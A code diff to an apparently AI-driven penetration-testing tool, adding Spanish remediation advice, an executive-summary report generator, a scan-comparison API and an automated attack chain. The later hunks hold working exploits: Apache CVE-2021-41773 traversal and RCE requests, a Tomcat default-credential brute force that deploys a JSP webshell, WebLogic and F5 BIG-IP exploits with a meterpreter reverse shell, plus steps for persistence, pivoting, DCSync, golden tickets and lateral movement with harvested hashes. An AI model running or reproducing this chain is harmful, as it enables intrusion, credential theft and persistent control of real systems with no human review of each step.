@@ -916,6 +916,122 @@ def _auto_mitre_tag(finding):
             break
     return finding
 
+# ── Auto-remediation database ──────────────────────────────────────────────────
+_REMEDIATION_DB = [
+    # Pattern (against title+description) → remediation text
+    (r'ms17-010|eternalblue',
+     "Aplicar parche MS17-010 de Microsoft (KB4012212). Deshabilitar SMBv1 via PowerShell: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`. Implementar segmentación de red para aislar sistemas Windows antiguos."),
+    (r'ms08-067',
+     "Aplicar parche MS08-067 (KB958644). Actualizar a Windows 7+ mínimo o aislar el sistema detrás de firewall con acceso SMB (445) bloqueado."),
+    (r'bluekeep|cve-2019-0708',
+     "Instalar parche KB4499175. Deshabilitar RDP si no es necesario o restringir acceso via VPN con MFA. Habilitar NLA (Network Level Authentication)."),
+    (r'zerologon|cve-2020-1472',
+     "Aplicar parche de agosto 2020 (KB4571694). Habilitar 'FullSecureChannelProtection' vía Group Policy. Monitorizar eventos 5827/5828/5829 en DC."),
+    (r'printnightmare|cve-2021-1675|cve-2021-34527',
+     "Deshabilitar Print Spooler si no es necesario: `Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled`. Instalar parche KB5004945."),
+    (r'sql.injection|sqlmap|injectable',
+     "Usar prepared statements / parameterized queries en todas las consultas SQL. Implementar WAF. Principio de mínimo privilegio para cuentas de BD. Validar y sanitizar todos los inputs de usuario."),
+    (r'xss|cross.site.scripting',
+     "Implementar Content-Security-Policy (CSP) estricta. Escapar todos los outputs HTML (htmlspecialchars). Usar HTTPOnly y Secure flags en cookies. Validar inputs en servidor."),
+    (r'lfi|local file inclusion|path traversal',
+     "Evitar usar input del usuario en rutas de archivo. Usar realpath() + validar que el path resultante esté dentro del directorio permitido. Deshabilitar allow_url_include en PHP. Implementar chroot."),
+    (r'rce|remote code execution|command injection',
+     "Nunca pasar input del usuario a funciones de ejecución de sistema (exec, system, shell_exec). Usar APIs del lenguaje en lugar de comandos shell. Implementar sandboxing y principio de mínimo privilegio."),
+    (r'ssrf|server.side request forgery',
+     "Implementar whitelist de URLs/IPs permitidas. Bloquear acceso a metadatos cloud (169.254.169.254) en firewall. No exponer respuestas de requests internos al cliente."),
+    (r'xxe|xml external entity',
+     "Deshabilitar procesamiento de entidades externas XML: `FEATURE_EXTERNAL_GENERAL_ENTITIES = False`. Usar JSON en lugar de XML donde sea posible. Actualizar librerías XML."),
+    (r'ssti|template injection',
+     "Nunca renderizar templates con input no confiable. Usar sandboxed template engines. Escapar variables de usuario antes de pasarlas a templates."),
+    (r'jwt|json web token',
+     "Usar algoritmos asimétricos (RS256/ES256). Validar el claim 'alg' en servidor. Usar secrets de alta entropía (256+ bits). Implementar token expiration corto (15 min) + refresh tokens. Usar librerías actualizadas."),
+    (r'deserialization|insecure.*deserializ',
+     "Nunca deserializar datos de fuentes no confiables. Implementar signature/HMAC de datos serializados. Usar formatos seguros (JSON/protobuf). Actualizar librerías de serialización."),
+    (r'wordpress|wp-admin|wp-login',
+     "Actualizar WordPress core, plugins y temas. Usar contraseñas fuertes y 2FA en wp-admin. Limitar intentos de login. Ocultar wp-login.php con obscurity. Principio de mínimo privilegio para usuarios."),
+    (r'default.*cred|default.*password|admin:admin',
+     "Cambiar inmediatamente credenciales por defecto. Implementar política de contraseñas fuertes. Usar un gestor de contraseñas. Auditar todas las credenciales del sistema."),
+    (r'ssh.*root|permitrootlogin',
+     "Deshabilitar login SSH como root: `PermitRootLogin no` en /etc/ssh/sshd_config. Usar usuarios con sudo. Implementar autenticación por clave SSH. Deshabilitar autenticación por contraseña."),
+    (r'smb.*signing.*disabled|ntlm.*relay',
+     "Habilitar SMB signing en todos los sistemas: GPO → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Microsoft network server: Digitally sign communications'."),
+    (r'kerberoast',
+     "Usar contraseñas largas (25+ caracteres) para cuentas de servicio. Implementar gMSA (Group Managed Service Accounts). Detectar solicitudes de TGS inusuales en el SIEM."),
+    (r'asrep|as.rep',
+     "Habilitar Kerberos pre-authentication para todas las cuentas. Revisar cuentas con 'Do not require Kerberos preauthentication' activo."),
+    (r'pass.the.hash|pth',
+     "Implementar Credential Guard. Usar cuentas locales únicas por sistema (LAPS). Deshabilitar NTLMv1. Monitorizar autenticaciones NTLM inusuales."),
+    (r'golden ticket|krbtgt',
+     "Resetear la contraseña de krbtgt DOS VECES (con 10h de diferencia). Implementar PAC validation. Monitorizar tickets con vida útil >10h o sin PAC."),
+    (r'ldap.*anon|ldap.*bind',
+     "Deshabilitar LDAP anonymous bind. Usar LDAP over SSL (LDAPS). Auditar permisos del directorio activo."),
+    (r'snmp.*community|snmp.*public|snmp.*private',
+     "Cambiar community strings por defecto. Migrar a SNMPv3 con autenticación y cifrado. Restringir acceso SNMP por ACL al servidor de monitorización. Deshabilitar SNMP si no es necesario."),
+    (r'redis.*no.?auth|redis.*unauthenticated',
+     "Configurar `requirepass` en redis.conf. Bindear Redis solo a localhost o IP de confianza (bind 127.0.0.1). Deshabilitar comandos peligrosos (CONFIG, SLAVEOF, DEBUG)."),
+    (r'mongodb.*no.?auth|mongodb.*unauthenticated',
+     "Habilitar autenticación MongoDB: `security.authorization: enabled`. Bindear a localhost. Usar TLS. Crear usuarios con mínimo privilegio."),
+    (r'memcached',
+     "Bindear Memcached solo a interfaces internas. Implementar firewall para bloquear puerto 11211 desde exterior. Considerar migrar a Redis con autenticación."),
+    (r'ftp.*anon|anonymous.*ftp',
+     "Deshabilitar acceso FTP anónimo. Si se necesita, usar SFTP en su lugar. Auditar qué archivos son accesibles anónimamente."),
+    (r'nfs.*no_root_squash',
+     "Configurar `root_squash` en /etc/exports. Limitar exports a IPs específicas. Usar NFSv4 con Kerberos authentication. Revisar permisos de directorios exportados."),
+    (r'docker.*group|docker.*escape',
+     "No añadir usuarios al grupo docker innecesariamente. Usar rootless Docker. Implementar AppArmor/SELinux profiles para contenedores. Usar --no-new-privileges flag."),
+    (r'sudo.*nopasswd|gtfobins',
+     "Revisar y restringir entradas /etc/sudoers. Eliminar NOPASSWD excepto donde sea estrictamente necesario. Documentar y auditar todos los privilegios sudo."),
+    (r'log4shell|cve-2021-44228|jndi.*inject',
+     "Actualizar Log4j a 2.17.1+. Si no es posible, establecer `log4j2.formatMsgNoLookups=true` o `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`. Implementar WAF con reglas Log4Shell."),
+    (r'spring4shell|cve-2022-22965',
+     "Actualizar Spring Framework a 5.3.18+ / 5.2.20+. Actualizar Tomcat a 9.0.62+ / 8.5.78+. Usar JDK 9+ con configuración restrictiva de ClassLoader."),
+    (r'confluence.*ognl|cve-2022-26134',
+     "Actualizar Confluence a versión parcheada (7.4.17+, 7.13.7+, 7.14.3+, 7.15.2+, 7.16.4+, 7.17.4+, 7.18.1+). Si no es posible, implementar WAF o restringir acceso."),
+    (r'exchange.*proxy|proxylogon|proxyshell|cve-2021-2685[5-9]',
+     "Aplicar parches KB5001779 (ProxyLogon) y KB5001779 (ProxyShell). Actualizar Exchange a CU más reciente. Revisar reglas de redirección en OWA y PowerShell endpoints."),
+    (r'cors.*misconfiguration|cors.*null|cors.*wildcard',
+     "Configurar Access-Control-Allow-Origin con lista blanca explícita de dominios. Nunca reflejar el header Origin sin validación. No usar credenciales con Access-Control-Allow-Origin: *."),
+    (r'file upload|unrestricted upload|webshell.*upload',
+     "Validar extensión y MIME type en servidor. Almacenar uploads fuera del document root o en bucket S3 sin ejecución. Renombrar archivos subidos. Antivirus en uploads."),
+    (r'cve-2021-41773|apache.*path.traversal|cve-2021-42013',
+     "Actualizar Apache a 2.4.51+. Deshabilitar mod_cgi si no es necesario. Configurar 'Require all denied' como default en <Directory />."),
+    (r'tomcat.*manager|war.*deploy',
+     "Cambiar credenciales del Tomcat Manager. Restringir acceso por IP (RemoteAddrValve). Deshabilitar el Manager en producción si no se usa. Usar AJP con secret."),
+    (r'gitlab.*rce|cve-2021-22205',
+     "Actualizar GitLab a 13.10.3+. Auditar usuarios con acceso API. Implementar WAF con reglas para uploads de imágenes."),
+    (r'f5.*big-ip|cve-2022-1388',
+     "Aplicar hotfix de F5 para CVE-2022-1388. Bloquear acceso a /mgmt/ desde IPs no autorizadas. Deshabilitar TMUI si no se usa externamente."),
+    (r'citrix.*netscaler|cve-2019-19781',
+     "Aplicar parches de Citrix para CVE-2019-19781. Verificar si la instancia ha sido comprometida (indicadores de compromiso de Citrix). Resetear todas las credenciales si se sospecha compromiso."),
+    (r'suid.*exploit|setuid|cap_setuid',
+     "Auditar binarios con SUID: `find / -perm -4000 -type f`. Eliminar SUID de binarios no necesarios. Usar capabilities mínimas en lugar de SUID. Implementar AppArmor/SELinux."),
+    (r'kernel.*exploit|dirtypipe|dirtycow|pwnkit',
+     "Actualizar el kernel del sistema operativo. Implementar proceso regular de patching. Usar grsecurity/PaX donde sea posible. Considerar contenedores con capacidades reducidas."),
+    (r'crontab.*writable|writable.*cron',
+     "Asegurar que scripts ejecutados por cron no sean escribibles por usuarios no privilegiados. Auditar permisos: `ls -la /etc/cron*`. Usar AIDE para detectar modificaciones."),
+]
+
+def _auto_remediation(finding):
+    """Attach remediation recommendation based on finding title+description."""
+    if finding.get("remediation"):
+        return finding
+    text = f"{finding.get('title', '')} {finding.get('description', '')} {finding.get('cve', '')}".lower()
+    for pattern, remediation in _REMEDIATION_DB:
+        if re.search(pattern, text, re.IGNORECASE):
+            finding["remediation"] = remediation
+            break
+    if not finding.get("remediation"):
+        # Generic by severity
+        sev = finding.get("severity", "info")
+        finding["remediation"] = {
+            "critical": "Aplicar parche del fabricante de forma inmediata. Aislar el sistema afectado hasta que sea parcheado. Revisar indicadores de compromiso.",
+            "high":     "Planificar remediación en los próximos 7 días. Implementar controles compensatorios hasta que se pueda aplicar el parche.",
+            "medium":   "Planificar remediación en los próximos 30 días. Evaluar el riesgo en contexto del entorno.",
+            "low":      "Planificar remediación en el próximo ciclo de mantenimiento.",
+            "info":     "Revisar y evaluar si esta configuración es apropiada para el entorno.",
+        }.get(sev, "Revisar y aplicar las mejores prácticas del fabricante.")
+    return finding
+
 # ── MSF auto-command templates ─────────────────────────────────────────────
 # pattern (against title+desc+cve) -> msfconsole command block template
 _MSF_AUTO_CMDS = [
@@ -2357,6 +2473,88 @@ def _esc(s):
         return ""
     return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
 
+def _generate_exec_summary(project, findings, counts):
+    """Generate non-technical executive summary paragraph."""
+    name = project.get("name", "el sistema analizado")
+    client = project.get("client") or "el cliente"
+    targets = ", ".join((project.get("targets") or [])[:3])
+    total = len(findings)
+    crits = counts.get("critical", 0)
+    highs = counts.get("high", 0)
+
+    # Risk level
+    if crits >= 3 or (crits >= 1 and highs >= 3):
+        risk_level = "MUY ALTO"
+        risk_color = "#f85149"
+        risk_text = (f"Se detectaron <strong>{crits} vulnerabilidades críticas</strong> que permiten "
+                     f"acceso no autorizado completo al sistema. Un atacante con acceso a la red podría "
+                     f"comprometer el entorno en cuestión de minutos sin necesidad de credenciales.")
+    elif crits >= 1:
+        risk_level = "ALTO"
+        risk_color = "#f0883e"
+        risk_text = (f"Se detectó <strong>{crits} vulnerabilidad crítica</strong> que permite compromiso "
+                     f"total del sistema. Requiere remediación inmediata antes de continuar en operación.")
+    elif highs >= 3:
+        risk_level = "ALTO"
+        risk_color = "#f0883e"
+        risk_text = (f"Se detectaron <strong>{highs} vulnerabilidades de severidad alta</strong>. "
+                     f"Aunque ninguna permite compromiso inmediato sin interacción, su combinación "
+                     f"representa un riesgo significativo para la confidencialidad e integridad de los datos.")
+    elif highs >= 1:
+        risk_level = "MEDIO"
+        risk_color = "#d29922"
+        risk_text = (f"Se detectaron vulnerabilidades de severidad alta que requieren atención prioritaria. "
+                     f"El riesgo global es manejable con las acciones de remediación indicadas.")
+    elif total > 0:
+        risk_level = "BAJO"
+        risk_color = "#3fb950"
+        risk_text = "El entorno presenta una postura de seguridad razonablemente sólida con áreas de mejora identificadas."
+    else:
+        risk_level = "MÍNIMO"
+        risk_color = "#58a6ff"
+        risk_text = "No se detectaron vulnerabilidades significativas durante el período de análisis."
+
+    # Compromised assets
+    compromised = [f for f in findings if any(k in f.get("title","").lower() + f.get("description","").lower()
+                   for k in ["rce", "shell", "compromised", "domain admin", "root", "meterpreter", "pwn3d"])]
+    comp_text = ""
+    if compromised:
+        comp_text = (f"<p>⚠️ <strong>Durante la auditoría se obtuvo acceso remoto a {len(compromised)} sistema(s)</strong>, "
+                     f"demostrando el impacto real de las vulnerabilidades identificadas.</p>")
+
+    # Top critical findings for exec
+    top_findings = [f for f in findings if f.get("severity") in ("critical", "high")][:5]
+    top_html = ""
+    if top_findings:
+        top_html = "<p><strong>Principales hallazgos:</strong></p><ul>"
+        for f in top_findings:
+            sev_icon = "🔴" if f.get("severity") == "critical" else "🟠"
+            top_html += f"<li>{sev_icon} <strong>{_esc(f.get('title',''))}</strong>"
+            if f.get("hosts"):
+                top_html += f" — {_esc(f['hosts'][0])}"
+            top_html += "</li>"
+        top_html += "</ul>"
+
+    return f"""
+    <div style="background:#fff;border-radius:8px;padding:24px;margin-bottom:20px;border:1px solid #dee2e6;box-shadow:0 1px 4px rgba(0,0,0,.06)">
+      <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px">
+        <div style="padding:8px 20px;border-radius:6px;background:{risk_color}20;color:{risk_color};border:2px solid {risk_color};font-weight:700;font-size:1.1em">
+          RIESGO {risk_level}
+        </div>
+        <div style="color:#6c757d;font-size:13px">
+          {total} hallazgos totales · Targets: {_esc(targets or '—')}
+        </div>
+      </div>
+      <p style="font-size:14px;line-height:1.7;margin:0 0 12px">{risk_text}</p>
+      {comp_text}
+      {top_html}
+      <p style="font-size:12px;color:#6c757d;margin:12px 0 0;border-top:1px solid #dee2e6;padding-top:12px">
+        Este informe fue generado automáticamente por PentSuite. Los hallazgos han sido verificados
+        con evidencia de explotación real donde es aplicable. Para más información técnica, consultar
+        la sección de hallazgos detallados.
+      </p>
+    </div>"""
+
 def _generate_html_report(project):
     now = datetime.now().strftime("%d/%m/%Y %H:%M")
     findings = project.get("findings", [])
@@ -2370,6 +2568,7 @@ def _generate_html_report(project):
 
     findings_sorted = sorted(findings, key=lambda f: SEV_ORDER.get(f.get("severity", "info"), 4))
     counts = {s: sum(1 for f in findings if f.get("severity") == s) for s in SEV_ORDER}
+    exec_summary_html = _generate_exec_summary(project, findings, counts)
 
     findings_html = ""
     for f in findings_sorted:
@@ -2384,14 +2583,14 @@ def _generate_html_report(project):
             <span class="fstatus">{_esc(f.get('status','open'))}</span>
           </div>
           <table class="ft">
-            {'<tr><td>CVE</td><td>' + _esc(f.get('cve','')) + '</td></tr>' if f.get('cve') else ''}
-            {'<tr><td>CVSS</td><td>' + str(f.get('cvss','')) + '</td></tr>' if f.get('cvss') is not None else ''}
-            {'<tr><td>MITRE ATT&CK</td><td><b>' + _esc(f.get('mitre_technique','')) + '</b> — ' + _esc(f.get('mitre_name','')) + '</td></tr>' if f.get('mitre_technique') else ''}
+            {'<tr><td>CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/' + _esc(f.get('cve','')) + '" target="_blank">' + _esc(f.get('cve','')) + '</a></td></tr>' if f.get('cve') else ''}
+            {'<tr><td>CVSS v3</td><td><span style="font-weight:700;color:' + ('#f85149' if (f.get('cvss') or 0)>=9 else '#f0883e' if (f.get('cvss') or 0)>=7 else '#d29922' if (f.get('cvss') or 0)>=4 else '#3fb950') + '">' + str(f.get('cvss','')) + '</span>' + (' <small style="color:#8b949e;font-family:monospace">' + _esc(f.get('cvss_vector','')) + '</small>' if f.get('cvss_vector') else '') + '</td></tr>' if f.get('cvss') is not None else ''}
+            {'<tr><td>MITRE ATT&CK</td><td><a href="https://attack.mitre.org/techniques/' + _esc(f.get('mitre_technique','').replace('.','/')).split('/')[0] + '/" target="_blank"><b>' + _esc(f.get('mitre_technique','')) + '</b></a> — ' + _esc(f.get('mitre_name','')) + '</td></tr>' if f.get('mitre_technique') else ''}
             <tr><td>Hosts</td><td>{_esc(hosts)}</td></tr>
           </table>
           {'<div class="fl">Descripción</div><p>' + _esc(f.get('description','')) + '</p>' if f.get('description') else ''}
           {'<div class="fl">Evidencia</div><pre>' + _esc(f.get('evidence','')) + '</pre>' if f.get('evidence') else ''}
-          {'<div class="fl">Remediación</div><p>' + _esc(f.get('remediation','')) + '</p>' if f.get('remediation') else ''}
+          {'<div class="fl" style="color:#3fb950">✔ Remediación</div><div style="background:#f0fff4;border:1px solid #3fb95030;border-radius:4px;padding:10px 14px;margin:4px 0 8px;font-size:13px;line-height:1.6">' + _esc(f.get('remediation','')) + '</div>' if f.get('remediation') else ''}
         </div>"""
 
     loot_html = ""
@@ -2463,6 +2662,7 @@ ul{{padding-left:20px}}li{{margin:4px 0;font-size:13px}}
 </div>
 <div class="wrap">
   <h2>Resumen Ejecutivo</h2>
+  {exec_summary_html}
   <div class="grid">
     <div class="card"><div class="n" style="color:#f85149">{counts.get('critical',0)}</div><div class="l">Crítico</div></div>
     <div class="card"><div class="n" style="color:#f0883e">{counts.get('high',0)}</div><div class="l">Alto</div></div>
@@ -3885,6 +4085,47 @@ def export_pdf_report(project_id):
     resp.headers["Content-Type"] = "text/html; charset=utf-8"
     resp.headers["Content-Disposition"] = f'inline; filename="{safe_name}_print.html"'
     return resp
+
+
+# ── Scan Comparison Report ────────────────────────────────────────────────────
+
+@app.route("/api/projects/<project_id>/compare/<baseline_id>")
+@api_login_required
+def compare_scans(project_id, baseline_id):
+    """Compare current scan findings against a baseline scan — show new, fixed, and persisting."""
+    current = read_project(project_id)
+    baseline = read_project(baseline_id)
+    if not current or not baseline:
+        return jsonify({"error": "Project not found"}), 404
+
+    cur_findings = {f.get("title", ""): f for f in current.get("findings", [])}
+    base_findings = {f.get("title", ""): f for f in baseline.get("findings", [])}
+
+    new_findings     = [f for t, f in cur_findings.items() if t not in base_findings]
+    fixed_findings   = [f for t, f in base_findings.items() if t not in cur_findings]
+    persist_findings = [f for t, f in cur_findings.items() if t in base_findings]
+
+    SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
+
+    def _sev_counts(lst):
+        return {s: sum(1 for f in lst if f.get("severity") == s)
+                for s in SEV_ORDER}
+
+    return jsonify({
+        "current_project": current.get("name"),
+        "baseline_project": baseline.get("name"),
+        "summary": {
+            "new_count":     len(new_findings),
+            "fixed_count":   len(fixed_findings),
+            "persisting_count": len(persist_findings),
+            "regression": len(new_findings) > len(fixed_findings),
+        },
+        "new": sorted(new_findings, key=lambda f: SEV_ORDER.get(f.get("severity"), 4)),
+        "fixed": sorted(fixed_findings, key=lambda f: SEV_ORDER.get(f.get("severity"), 4)),
+        "persisting": sorted(persist_findings, key=lambda f: SEV_ORDER.get(f.get("severity"), 4)),
+        "new_sev_counts": _sev_counts(new_findings),
+        "fixed_sev_counts": _sev_counts(fixed_findings),
+    })
 
 
 # ── Word (.docx) Report ────────────────────────────────────────────────────────
@@ -6840,6 +7081,7 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 f["source"] = "claude-autopilot"
                 _enrich_finding_cvss(f)
                 _auto_mitre_tag(f)
+                _auto_remediation(f)
                 _attach_msf_command(f, target, vars_dict)
                 project.setdefault("findings", []).append(f)
                 existing.add(title)
@@ -8501,6 +8743,16 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 "cve": "",
             }], target)
 
+        # ── Step 6: Set up SOCKS5 pivot if internal hosts discovered ─────
+        if new_ips:
+            self._setup_pivot(target, user, pwd, accumulated_output)
+
+        # ── Step 7: Establish persistence ────────────────────────────────
+        # Detect if we have root/sudo access from earlier steps
+        _combined_out = "\n".join(accumulated_output[-20:])
+        _is_root = bool(re.search(r'uid=0\(root\)|root@|#\s*$|NOPASSWD.*ALL|SYSTEM', _combined_out, re.IGNORECASE))
+        self._establish_persistence(target, user, pwd, _is_root, accumulated_output)
+
     # ─────────────────────────────────────────────────────────────────────────
     # Windows post-exploitation chain (secretsdump, pass-the-hash, potato)
     # ─────────────────────────────────────────────────────────────────────────
@@ -8590,12 +8842,25 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 self._auto_crack_hashes(backup_out, target, accumulated_output)
                 accumulated_output.append(f"=== SAM Dump ===\n{backup_out[:600]}")
 
-        # ── 4. AD recon (if domain controller) ───────────────────────────
+        # ── 4. AD recon + DCSync + lateral movement (if domain controller) ──
         dc_indicators = ["domain controller", "active directory", "ldap", "kerberos", "win-dc"]
-        if any(ind in (shell_output or "").lower() for ind in dc_indicators) or 88 in {
-            p["port"] for p in ([] if not hasattr(self, "_last_open_ports") else self._last_open_ports)
-        }:
+        _open_port_set = {p["port"] for p in ([] if not hasattr(self, "_last_open_ports") else self._last_open_ports)}
+        if any(ind in (shell_output or "").lower() for ind in dc_indicators) or 88 in _open_port_set:
             self._ad_attacks(target, user, pwd, accumulated_output)
+            # DCSync + Golden Ticket — requires domain admin or replication rights
+            self._dcsync_golden_ticket(target, user, pwd, accumulated_output)
+
+        # ── 5. Lateral movement to all discovered Windows hosts ───────────
+        creds_and_hashes = []
+        _dump_text = "\n".join(accumulated_output[-30:])
+        # Collect NTLM hashes found during this session
+        for _u, _lm, _nt in re.findall(r'(\w+):[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', _dump_text):
+            creds_and_hashes.append({"user": _u, "hash": _nt, "type": "ntlm"})
+        # Collect cleartext credentials
+        for _cu, _cp in re.findall(r'(?:user|login)[:\s]+(\w+).*?(?:pass|pwd)[:\s]+(\S+)', _dump_text, re.IGNORECASE | re.DOTALL):
+            creds_and_hashes.append({"user": _cu, "password": _cp, "type": "cleartext"})
+        if creds_and_hashes:
+            self._lateral_movement_windows(target, self._last_open_ports if hasattr(self, "_last_open_ports") else [], creds_and_hashes, accumulated_output)
 
     # ─────────────────────────────────────────────────────────────────────────
     # Active Directory attacks (Kerberoasting, AS-REP, BloodHound)
@@ -9580,6 +9845,660 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                         "cve": "",
                     }], target)
 
+    # ─────────────────────────────────────────────────────────────────────────
+    # Category B: Enterprise exploits
+    # ─────────────────────────────────────────────────────────────────────────
+    def _enterprise_exploits(self, target, open_ports, accumulated_output):
+        """Apache 2.4.49 RCE, Tomcat WAR, WebLogic, F5 BIG-IP, GitLab, Citrix, Exchange."""
+        port_set = {p["port"]: p for p in open_ports}
+        http_ports = [p for p in open_ports if "http" in p["service"].lower() or p["port"] in (80,443,8080,8443,8888,7001,4848,9090,7443)]
+
+        for p in http_ports[:5]:
+            port_num = p["port"]
+            proto = "https" if port_num in (443,8443,7443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+            ver = p.get("version","").lower()
+            svc = p.get("service","").lower()
+
+            # ── Apache 2.4.49/50 path traversal + RCE (CVE-2021-41773/42013) ──
+            if "apache" in ver or "httpd" in ver or "apache" in svc:
+                self._log(f"[Claude] ENTERPRISE: Apache path traversal CVE-2021-41773 @ {base}")
+                apache_out, _ = self._run_cmd(
+                    f"apache-41773-{port_num}",
+                    f"# CVE-2021-41773: path traversal\n"
+                    f"curl -s --max-time 10 '{base}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>/dev/null | head -5; "
+                    f"curl -s --max-time 10 '{base}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' 2>/dev/null | head -5; "
+                    f"# CVE-2021-41773 RCE via mod_cgi\n"
+                    f"curl -s --max-time 10 '{base}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' "
+                    f"-d 'echo Content-Type: text/plain; echo; id; hostname' 2>/dev/null | head -3; "
+                    f"# CVE-2021-42013 (2.4.50)\n"
+                    f"curl -s --max-time 10 '{base}/cgi-bin/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/etc/passwd' 2>/dev/null | head -5",
+                    target, timeout=25,
+                )
+                if "root:" in apache_out or "uid=" in apache_out:
+                    self._capture_evidence(apache_out, target, f"apache-rce-{port_num}", "CVE-2021-41773/42013")
+                    accumulated_output.append(f"=== Apache Path Traversal RCE ===\n{apache_out[:500]}")
+                    self._save_findings([{
+                        "title": f"Apache 2.4.49/50 Path Traversal + RCE CVE-2021-41773 @ {base}",
+                        "severity": "critical",
+                        "description": f"Path traversal + RCE sin autenticación via mod_cgi.\n{apache_out[:200]}",
+                        "cve": "CVE-2021-41773",
+                    }], target)
+
+            # ── Tomcat Manager → WAR deploy → shell ──────────────────────
+            if "tomcat" in ver or port_num in (8080,8443,8005,8009):
+                self._log(f"[Claude] ENTERPRISE: Tomcat Manager brute → WAR deploy @ {base}")
+                tc_creds = [("tomcat","tomcat"),("admin","admin"),("manager","manager"),("tomcat","s3cret"),("admin","password"),("admin","s3cret")]
+                for tc_u, tc_p in tc_creds:
+                    tc_check, _ = self._run_cmd(
+                        f"tomcat-mgr-{tc_u}",
+                        f"curl -s --max-time 8 -u '{tc_u}:{tc_p}' "
+                        f"-o /dev/null -w '%{{http_code}}' '{base}/manager/html' 2>/dev/null",
+                        target, timeout=10,
+                    )
+                    if tc_check.strip() == "200":
+                        self._log(f"[Claude] ENTERPRISE: Tomcat Manager accesible {tc_u}:{tc_p} → desplegando WAR!")
+                        # Create minimal WAR with JSP webshell
+                        war_out, _ = self._run_cmd(
+                            f"tomcat-war-deploy-{tc_u}",
+                            f"# Create JSP webshell WAR\n"
+                            f"WARDIR=$(mktemp -d); mkdir -p $WARDIR/WEB-INF; "
+                            f"echo '<%@ page import=\"java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); "
+                            f"BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); "
+                            f"String line; while((line=br.readLine())!=null){{out.println(line);}} %>' > $WARDIR/shell.jsp; "
+                            f"echo '<web-app/>' > $WARDIR/WEB-INF/web.xml; "
+                            f"cd $WARDIR && jar cvf /tmp/pwn_{target.replace('.','_')}.war . 2>/dev/null; "
+                            f"# Deploy WAR\n"
+                            f"curl -s --max-time 20 -u '{tc_u}:{tc_p}' "
+                            f"-T /tmp/pwn_{target.replace('.','_')}.war "
+                            f"'{base}/manager/text/deploy?path=/pwn&update=true' 2>/dev/null; "
+                            f"# Test execution\n"
+                            f"sleep 3; curl -s --max-time 10 '{base}/pwn/shell.jsp?cmd=id' 2>/dev/null | head -3",
+                            target, timeout=40,
+                        )
+                        self._capture_evidence(war_out, target, f"tomcat-war-{tc_u}", "Tomcat WAR RCE")
+                        accumulated_output.append(f"=== Tomcat WAR Deploy RCE ({tc_u}:{tc_p}) ===\n{war_out[:500]}")
+                        self._save_findings([{
+                            "title": f"Tomcat Manager Credenciales Débiles + RCE via WAR @ {base}",
+                            "severity": "critical",
+                            "description": f"Tomcat Manager accesible con {tc_u}:{tc_p} → WAR webshell desplegado → RCE.",
+                            "cve": "",
+                        }], target)
+                        break
+
+            # ── WebLogic deserialization (CVE-2019-2725 + CVE-2020-14882) ─
+            if port_num in (7001,7002,4848,9200) or "weblogic" in ver or "oracle" in svc:
+                self._log(f"[Claude] ENTERPRISE: WebLogic RCE check @ {base}")
+                wl_out, _ = self._run_cmd(
+                    f"weblogic-rce-{port_num}",
+                    f"# CVE-2020-14882 — admin console bypass\n"
+                    f"curl -s --max-time 10 '{base}/console/images/%252E%252E%252Fconsole.portal' "
+                    f"2>/dev/null | grep -iE 'weblogic|console|domain' | head -3; "
+                    f"# CVE-2020-14883 — admin console RCE\n"
+                    f"curl -s --max-time 10 -X POST "
+                    f"'{base}/console/css/%252E%252E%252Fconsole.portal' "
+                    f"-d '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec(new+String[]{{\\\"id\\\",\\\">/tmp/wl_proof.txt\\\"}});\")' "
+                    f"2>/dev/null | head -3; "
+                    f"# CVE-2019-2725 — deserialization\n"
+                    f"msfconsole -q -x 'use exploit/multi/misc/weblogic_deserialize_asyncresponseservice; "
+                    f"set RHOSTS {target}; set RPORT {port_num}; set LHOST {self.lhost}; set LPORT {self.lport}; "
+                    f"set payload java/meterpreter/reverse_tcp; run; sleep 12; exit' 2>/dev/null | head -15",
+                    target, timeout=60,
+                )
+                if any(k in wl_out.lower() for k in ["weblogic", "session", "uid=", "meterpreter"]):
+                    self._capture_evidence(wl_out, target, f"weblogic-rce-{port_num}", "WebLogic RCE")
+                    accumulated_output.append(f"=== WebLogic RCE ===\n{wl_out[:500]}")
+                    self._save_findings([{
+                        "title": f"WebLogic RCE CVE-2019-2725/CVE-2020-14882 @ {base}",
+                        "severity": "critical",
+                        "description": f"WebLogic Server vulnerable a deserialization/console bypass → RCE.",
+                        "cve": "CVE-2020-14882",
+                    }], target)
+
+            # ── F5 BIG-IP CVE-2022-1388 ───────────────────────────────────
+            if port_num in (443,8443,8080) or "f5" in ver or "big-ip" in ver:
+                f5_out, _ = self._run_cmd(
+                    f"f5-bigip-{port_num}",
+                    f"curl -sk --max-time 10 "
+                    f"-H 'Connection: X-F5-Auth-Token, X-Forwarded-Host' "
+                    f"-H 'X-F5-Auth-Token: a' "
+                    f"-H 'X-Forwarded-Host: localhost' "
+                    f"'{base}/mgmt/tm/util/bash' "
+                    f"-d '{{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}}' 2>/dev/null | head -5; "
+                    f"# Also try CVE-2020-5902\n"
+                    f"curl -sk --max-time 10 "
+                    f"'{base}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' "
+                    f"2>/dev/null | grep 'root:' | head -3",
